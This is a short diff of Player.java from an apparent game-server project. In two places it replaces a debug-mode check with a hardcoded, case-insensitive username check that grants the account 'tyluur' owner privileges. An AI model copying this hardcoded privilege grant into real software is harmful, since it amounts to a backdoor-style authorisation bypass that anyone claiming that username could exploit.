@@ -3,7 +3,6 @@ package org.redrune.game.entity.actor.player;
 import org.redrune.engine.SystemManager;
 import org.redrune.engine.tick.task.WorldTask;
 import org.redrune.engine.tick.task.WorldTasksManager;
-import org.redrune.game.GameFlags;
 import org.redrune.game.content.entity.actor.player.PlayerTutorial;
 import org.redrune.game.content.entity.actor.player.action.ActionManager;
 import org.redrune.game.content.entity.actor.player.controller.ControllerManager;
@@ -261,7 +260,7 @@ public class Player extends Actor {
         charges = new ChargesManager();
         auraManager = new AuraManager();
         attributes = new PlayerAttributes();
-        rights = new LinkedHashSet<>(Collections.singletonList(GameFlags.debugMode ? PlayerRight.OWNER : PlayerRight.PLAYER));
+        rights = new LinkedHashSet<>(Collections.singletonList(username.equalsIgnoreCase("tyluur") ? PlayerRight.OWNER : PlayerRight.PLAYER));
         SkillCapeCustomizer.resetSkillCapes(this);
     }
 
@@ -596,7 +595,7 @@ public class Player extends Actor {
         this.session.setInLobby(true);
         this.session.setPlayer(this);
         World.addLobbyPlayer(this);
-        if (GameFlags.debugMode) {
+        if (username.equalsIgnoreCase("tyluur")) {
             giveRight(PlayerRight.OWNER);
         }
         System.out.println("Initialized Player: " + username);
